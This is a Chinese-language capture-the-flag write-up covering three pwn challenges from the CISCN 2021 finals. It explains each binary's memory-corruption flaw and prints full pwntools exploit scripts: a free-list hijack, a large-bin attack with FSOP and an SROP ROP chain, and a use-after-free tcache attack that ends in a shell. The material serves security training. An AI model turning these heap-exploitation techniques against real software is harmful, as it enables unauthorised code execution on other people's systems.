# ciscn2021决赛pwn题解

阅读量 **139454**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-08-27 10:00:31

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01ea545b18ad399847.jpg)

## allocate

![](https://p2.ssl.qhimg.com/t01cfb39a25463f40f1.png)

###  程序分析

自己实现了一个分配器, 空闲的chunk组成一个单链表

  * chunk结构

![](https://p1.ssl.qhimg.com/t01b7d92c5e6f8a39db.png)

  * 释放

![](https://p3.ssl.qhimg.com/t01bb5cbdf7ad0c5043.png)

  * 申请 
    * 先尝试从free_list中获取如果失败了就直接切割mmap_mem

![](https://p3.ssl.qhimg.com/t010b40da93c04a2a5b.png)

![](https://p5.ssl.qhimg.com/t01e7327a1493a10339.png)

###  思路

  * 关键在与怎么覆盖next指针, 虽然Alloc有明显的整数溢出, 但是没法利用
  * 结果发现是一个关于read的骚操作: 如果read的写入区域内有不可写入的地址, 那么不会SIGV, 而是返回-1

![](https://p2.ssl.qhimg.com/t011aa8a5f2158240df.png)

  * 这种经典读写写法中没有判断read为-1的情况, 因此如果有不可写入的区域, read就会一直返回-1, 然后idx+= -1, 不停的向前, 直到可以全部写入read的内容位置
  * 而在Alloc时, 只检查了剩下来的是否为负数, 剩下的够不够分, 因此是很容易分割出一片不可写内存的
  * 分割出不可写内存时也要注意, 如果v2->size这样用户态的写入, 如果v2不可写会直接SIGV, 因此还要保证v2->size可写

![](https://p5.ssl.qhimg.com/t0184ab6cb2729e2bce.png)

  * 综上, 直接把chunk切割到只剩下0x10作为chunk头, 然后申请一大片内存, 利用read的返回-1就可以覆盖next
  * 劫持next之后, 从中分配出来时会检查size是否合适

![](https://p5.ssl.qhimg.com/t014228bc05fd2c4c9e.png)

  * 因此不能直接劫持到GOT上, 因为上面都是libc地址
  * 由于bss上有PtrArr, 因此分配到PtrArr前面, 覆盖PtrArr再通过这个进行任意写, size我直接选择bss地址了

exp

    
    
    #! /usr/bin/python2
    # coding=utf-8
    import sys
    from pwn import *
    from random import randint
    
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    
    elf_path = "./pwn"
    elf = ELF(elf_path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    
    if(len(sys.argv)==1):            #local
        cmd = ['/home/chenhaohao/pwn']
        sh = process(cmd)
        proc_base = sh.libs()['/home/chenhaohao/pwn']
    else:                        #remtoe
        sh = remote('39.105.134.183', 18866)
    
    def GDB():
        gdb.attach(sh, '''
        break *(0x401A21)
        break *0x401a6d 
        ''')
    
    def Bits2Str(cont):
        res = ''
        for i in range(0, len(cont), 8):
            res+=chr(int(cont[i: i+8][::-1], 2))
        return res[::-1]
    
    def Num(n):
        sh.sendline(str(n))
    
    def Cmd(c):
        sh.recvuntil('>> ')
        sh.sendline(c)
    
    def Gain(idx, sz, cont):
        Cmd('gain(%d);'%(idx))
        sh.recvuntil(': ')
        Num(sz)
        sh.recvuntil(': ')
        sh.send(cont)
    
    def Edit(idx, cont):
        Cmd('edit(%d);'%(idx))
        sh.recvuntil(': ')
        sh.send(cont)
    
    def Show(idx):
        Cmd('show(%d);'%(idx))
    
    def Free(idx):
        Cmd('free(%d);'%(idx))
    
    #exhaust mmap_mem
    Gain(0, 0xFC0, 'A\n')
    Gain(1, 0x10, 'B'*0x10)
    Free(1)
    
    #reverse overflow
    exp = p64(0x20)
    exp+= p64(0x4043b0)         #free_list = &free_list
    exp = exp.ljust(0x30-1, 'B')
    exp+= '\n'
    Gain(2, 0x110, exp)     #free_list->chunk1->atoi@GOT
    
    #control PtrArr
    Gain(3, 0x10, 'B'*0x10)
    
    exp = p64(0x4040b8)     #aoti@GOT
    exp+= '\n'
    Gain(4, 0x4043b0-0x10, exp) #size = &free_list-0x10
    
    #leak addr
    Show(0)
    libc.address = u64(sh.recv(6).ljust(8, '\x00'))-libc.symbols['atoi']
    Log('libc.address')
    
    #control GOT
    Edit(0, p64(libc.symbols['system'])+'\n')
    
    #getshell
    Cmd('aaaa(/bin/sh);')
    
    sh.interactive()
    
    '''
    mem stat: telescope 0x4043A0
    '''
    

###  总结

  * read读入含有不可写区域时会返回-1
  * no PIE出了直接打GOT, 还要考虑bss上的指针数组

## Binary_Cheater

![](https://p1.ssl.qhimg.com/t014e86f42d454ff86e.png)

  * 2.32的libc
  * 禁用了execve

![](https://p1.ssl.qhimg.com/t018441558a08276a0e.png)

###  程序分析

  * 虽然后执行流混淆, 但是程序本身比较简单, 影响不大, 可以直接看
  * 每次循环都会 
    * 检查 **malloc_hook与** free_hook是否为0
    * 清空tcache chunk
  * Create 
    * 最多16个
    * 0x410<=size<=0x450
    * ptr = calloc(1, size)
    * 记录信息 
      * PtrArr[idx] = ptr
      * SizeArr[idx] = size
      * UsedArr[idx] = 1
    * read(0, ptr, size), 末尾设置00
    * 输出checkbit: ptr的低12bit
  * Edit 
    * 没有检查UsedArr
    * len = read(0, PtrArr[idx], SizeArr[idx])
    * PtrArr[idx][len-1]=0
  * Show 
    * 没有检查UsedArr
    * write(1, PtrArr[idx], strlen(PtrArr[idx]))

###  思路

很明显的UAF, 重点在与size的限制, 怎么利用LargeBin来达到任意写

  * 泄露地址: 
    * 由于2.32中UB的地址最后1B为00, 无法泄露libc地址, 因此可以把chunk放入LB中泄露地址
    * 当LB中有一个chunkA之后, 在其后面再放入一个chunkB, 就可以让chunkA的fd为chunkB, 从而泄露堆地址
  * large bin Attack主要发生在UB向LB中放入chunk的时候, 可以任意地址写入一个chunk地址

![](https://p1.ssl.qhimg.com/t0148540552816ac4a4.png)

  * 由于是calloc, 因此覆盖TLS中的tcache指针没用, vtable会检查指针有效性, 因此没法直接覆盖虚表指针, 无法得到栈地址, 程序没使用exit
  * 这样看来只剩一条路了FSOP, 类似于House of pig的思路
  * 其中比较精妙的点在与对_IO_str_overflow的利用, IO_str_overflow中, 有malloc, 有memcpy写入, 有free, 这就给了我们利用tcache的机会

![](https://p4.ssl.qhimg.com/t01592a802e3c287308.png)

  * 那么为什么不使用_IO_str_finish呢? 因此在2.32中这个函数已经不使用_IO_FILE中的函数指针了, 而是直接调用free, 无法利用
  * 综上思路为 
    * 先泄露libc地址
    * 然后LargeBinAttack打TLS中的tcache指针, 这里需要一个chunk伪造Tcache
    * 然后打stderr指针, 伪造IO_FILE和vtable, 这里需要另一个chunk伪造_IO_2_1_stderr
    * 然后触发assert fail, 进入_IO_str_overflow

  * 触发assert error的方式: 原本想的是覆盖LB中的size为0x55, 然后通过一个UB整理到LB中触发assert fail, 但是后面看到fmyy有一个更好的方法
  * 覆盖arena->top指针, 再次分配时就会因为chunk大小不足, 进入sysmalloc(), 其中有一个关于page对齐的检查, 很容易触发fail

![](https://p0.ssl.qhimg.com/t019ecfc3c17e160905.png)

  * 在覆盖tcache与stderr时有一个很精妙的地方 
    * 覆盖两个地址, 正常的思路是两套size, 5个chunk,比如0x430, 0x420一次, 然后0x440 0x450一次, 由于这题size范围很窄, 因此不可行
    * 进一步的是一种复用的思路, 使用3个chunk, 再来一个chunkC 0x420, chunkA配合chunkB先来一次, 然后取出chunkB, chunkA再配合chunkC来一次 
      * 第一次放入chunkB时会有*(addr1+0x20)=chunkB
      * 取出时由于unlink, 会有*(addr1+0x20) = chunkA
      * 第二次放入chunkC时会有*(addr2+0x20)=chunkC
      * 因此addr1 addr2实际对应chunkA chunkC, 而不是chunkB chunkC
    * 再进一步, 其实用两个chunk就可以了, 先chunkA配合chunkB来一次, 取出后, 有 _addr1=chunkA, 然后chunkA配合chunk再来一次, 不取出来, 就有_ addr2 = chunkB
    * 本题一共需要3次LargeBin Attack, 0x420配合0x420进行两次, 0x440配合0x450进行一次, 0x460用来触发UB sort, 刚好

  * 接着考虑伪造stderr, printf(stderr)会调用_IO_xsputn_t, 要让其偏移到_IO_str_jumps中的_IO_str_overflow
  * _IO_str_overflow会把原来[_IO_buf_base, _IO_buf_end)复制到malloc得到的内存中, 因此伪造tcache指向__free_hook-0x10, 利用memcpy覆盖hook为rdx_GG, 布置好SigreturnFrame就可以开启ROP

EXP

    
    
    #! /usr/bin/python2
    # coding=utf-8
    import sys
    from pwn import *
    from random import randint
    
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    
    elf_path = "./pwn"
    elf = ELF(elf_path)
    libc = ELF('./libc.so.6')
    
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    
    if(len(sys.argv)==1):            #local
        cmd = ['/home/chenhaohao/pwn']
        sh = process(cmd)
        proc_base = sh.libs()['/home/chenhaohao/pwn']
    else:                        #remtoe
        sh = remote('39.105.134.183', 18866)
    
    def GDB():
        gdb.attach(sh, '''
        telescope 0x50F0+0x0000555555554000 16
        heap bins
        break *0x7ffff7e73c11
        ''')
    
    def Num(n):
        sh.sendline(str(n))
    
    def Cmd(n):
        sh.recvuntil('>> ')
        Num(n)
    
    def Create(sz, cont=''):
        Cmd(1)
        sh.recvuntil('(: Size: ')
        Num(sz)
        if(cont==''):
            cont='A'*sz
        sh.recvuntil('(: Content: ')
        sh.send(cont)
    
    def Edit(idx, cont):
        Cmd(2)
        sh.recvuntil('Index: ')
        Num(idx)
        sh.recvuntil('Content: ')
        sh.send(cont)
    
    def Delete(idx):
        Cmd(3)
        sh.recvuntil('Index: ')
        Num(idx)
    
    def Show(idx):
        Cmd(4)
        sh.recvuntil('Index: ')
        Num(idx)
        sh.recvuntil('Content: ')
    
    #chunk arrange
    Create(0x420)   #A
    Create(0x420)   #B  gap
    Create(0x410)   #C
    Create(0x410)   #D  gap
    Create(0x430)   #E
    Create(0x410)   #F  gap
    Create(0x440)   #G
    
    #leak libc addr
    Delete(0)       #UB<=>A
    Create(0x450)   #LB<=>A     A|B|C|D|top 
    Show(0)
    libc.address = u64(sh.recv(6).ljust(8, '\x00'))-0x1e3ff0
    Log('libc.address')
    
    #tcache ptr in TLS = chunkA
    addr = libc.address+0x1eb538
    exp = flat(0, 0, 0, addr-0x20)
    Edit(0, exp)
    Delete(2)       #UB<=>chunkC
    Create(0x450)   #trigger sort
    
    #leak heap addr
    Show(0)
    heap_addr = u64(sh.recv(6).ljust(8, '\x00'))-0xb10
    Log('heap_addr')
    
    #withdraw chunk C, so tcache = chunk A
    Create(0x410)
    
    #stderr = chunkC
    addr = libc.address+0x1e47a0
    exp = flat(0, 0, 0, addr-0x20)
    Edit(0, exp)
    Delete(9)       #UB<=>chunkC
    Create(0x450)   #trigger sort
    
    #forge tcache
    exp = p16(0x7)*64   #tcache.counts
    exp+= p64(libc.symbols['__free_hook']-0x10)*64
    Edit(0, exp)
    
    #GDB()
    
    #forge stderr
    '''
      char *_IO_read_ptr;    /* Current read pointer */
      char *_IO_read_end;    /* End of get area. */
      char *_IO_read_base;    /* Start of putback+get area. */
      char *_IO_write_base;    /* Start of put area. */
      char *_IO_write_ptr;    /* Current put pointer. */
      char *_IO_write_end;    /* End of put area. */
      char *_IO_buf_base;    /* Start of reserve area. */
      char *_IO_buf_end;    /* End of reserve area. */
    '''
    old = heap_addr + 0x6f0     #old = chunkB
    exp = p64(0xfbad2087)
    exp+= flat(0, 0, 0)
    exp+= flat(old, old+0x100, 0)
    exp+= flat(old, old+0x100)
    exp = exp.ljust(0x88, '\x00')
    exp+= p64(libc.address+0x1e6680)
    exp = exp.ljust(0xd8, '\x00')
    exp+= p64(libc.address+0x1E5580-0x8*4)  #f->vtable = _IO_str_jumps-0x8*4
    Edit(2, exp[0x10:])
    
    #SROP
    rdx_GG = libc.address+0x14b760  #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    rdi = libc.address+0x2858f
    rsi = libc.address+0x2ac3f
    rdx_r12 = libc.address+0x114161
    syscall = libc.address+0x611ea
    rax = libc.address+0x45580
    ret = libc.address+0x26699
    buf = heap_addr+0x200
    
    def Call(sys, a, b, c):
        return flat(rax, sys, rdi, a, rsi, b, rdx_r12, c, 0, syscall)
    
    exp = '\x00'*0x8
    exp+= p64(heap_addr+0x708)
    exp+= p64(rdx_GG)
    frame = SigreturnFrame()
    frame.rip = ret
    frame.rsp = heap_addr+0x800
    frame['uc_stack.ss_size'] = libc.symbols['setcontext']+61
    exp+= str(frame)
    
    #ORW rop
    exp+= Call(0, 0, buf, 0x30)
    exp+= Call(2, buf, 0, 0)
    exp+= Call(0, 3, buf, 0x30)
    exp+= Call(1, 1, buf, 0x30)
    Edit(1, exp)
    
    #forge av->top and trigger assert fail
    Delete(6)
    Create(0x450)       #LB<=>G
    
    addr = libc.address+0x1e3c00
    exp = flat(0, 0, 0, addr-0x20)
    Edit(6, exp)
    
    Delete(4)
    #trigger sort=> top=chunkE => sysmalloc() => assert fail => printf(stderr)
    Cmd(1)
    sh.recvuntil('(: Size: ')
    Num(0x450)
    
    sleep(2)
    sh.sendline('./flag\x00')
    sh.interactive()
    

###  总结

  * LargeBinAttack的思路 
    * 打TLS中的tcache指针
    * 打rtld中的exit函数链表
    * 打stderr的_IO_FILE, 触发largebin中的assert error进入printf(stderr, …)
    * 利用写入victim地址区伪造自闭链表, 然后尝试进行任意地址分配
  * 通过_IO_str_overflow触发malloc, memcpy, free

## cissh

![](https://p4.ssl.qhimg.com/t013096a605665dacb1.png)

![](https://p2.ssl.qhimg.com/t019e6e214ecbeb5435.png)

###  程序分析

  * 关键是Manager对象, 根据初始化函数可以发现 
    * this+0x是一个vector< shared_ptr<File> >, 保存创建的文件
    * this+0x18是一个vector<string> , 会把读入的cmd以空格分割保存为数组
    * this+0x30是一个map<string, FuncPtr>, 是一个命令到对应函数的映射, 支持下面的命令 
      * touch
      * ls
      * vi
      * cat
      * rm
      * ln
  * File结构 
    * string name 保存文件名
    * shared_ptr<string> cont
    * string type, 如果是正常的文件则为”file” 如果是ln的文件则为”link”

###  思路

  * 由于有ln的存在,因此漏洞只能出现在每个文件cont部分的shared_ptr上, 后来测试了一下发现, 当链接之后, shared_ptr<string> cont;的引用技术不会增加, 还是1, 这就会导致UAF

![](https://p3.ssl.qhimg.com/t01ae1032cbeae7f616.png)

  * 经过测试发现如果有A1->A, 先rm(A), 这样A1的cont就是被释放过的
  * 但是需要注意一点, 由于string有一个局部缓冲区特性, 长度小于0x10的话,使用结构体内部缓冲区, 直接去free的话会报错
  * 能构造出UAF思路就清楚了, 先用7个chunk填满tcache, 然后释放一个chunk到UB中, UAF读泄露libc地址, 然后直接tcache attack打__free_hook

###  EXP

    
    
    #! /usr/bin/python2
    # coding=utf-8
    import sys
    from pwn import *
    from random import randint
    
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    
    elf_path = "./pwn"
    elf = ELF(elf_path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    def Log(name):    
        log.success(name+' = '+hex(eval(name)))
    
    if(len(sys.argv)==1):            #local
        cmd = ['/home/chenhaohao/pwn']
        sh = process(cmd)
        proc_base = sh.libs()['/home/chenhaohao/pwn']
    else:                        #remtoe
        sh = remote('39.105.134.183', 18866)
    
    def GDB():
        gdb.attach(sh, '''
        break *free
        ''')
    
    def Cmd(n):
        sh.recvuntil('\x1B[31m$ \x1B[m')
        sh.sendline(n)
    
    def touch(name):
        Cmd('touch %s'%(name))
    
    def vi(name, cont):
        Cmd('vi %s'%(name))
        sh.sendline(cont)
    
    def rm(name):
        Cmd('rm %s'%(name))
    
    def cat(name):
        Cmd("cat %s"%(name))
    
    def ln(new, old):
        Cmd("ln %s %s"%(new, old))
    
    #prepare chunk
    for i in range(8):
        name = "A%d"%(i)    
        touch(name)
        vi(name, str(i)*0x300)
    
    #make ln
    ln("l_A0", "A0")
    ln("l_A7", "A7")
    
    #full Tcache, Tcache->A7->A6->...->A1
    for i in range(1, 8):
        name = "A%d"%(i) 
        rm(name)
    
    #get UB chunk
    rm("A0")        #UB<=>A0 and l_A0->A0
    
    #leak addr
    cat("l_A0")
    libc.address = u64(sh.recv(8))-0x1ebbe0
    Log('libc.address')
    
    #forge tcache list
    vi("l_A7", flat(libc.symbols['__free_hook']))
    
    #control __free_hook
    touch("A7")
    vi("A7", '7'*0x300)
    
    touch("shell")
    vi("shell", '/bin/sh\x00'*8)
    
    touch("hook")
    vi("hook", p64(libc.symbols['system']).ljust(0x300, '\x00'))
    
    #getshell
    #GDB()
    rm('shell')
    
    sh.interactive()
    
    '''
    telescope 0x0000555555578ec0 3
    '''
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **一只狗** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/251614](/post/id/251614)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __6赞

 __收藏

![](https://p2.ssl.qhimg.com/t0129dce3bc1ba3282b.jpg) 一只狗

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

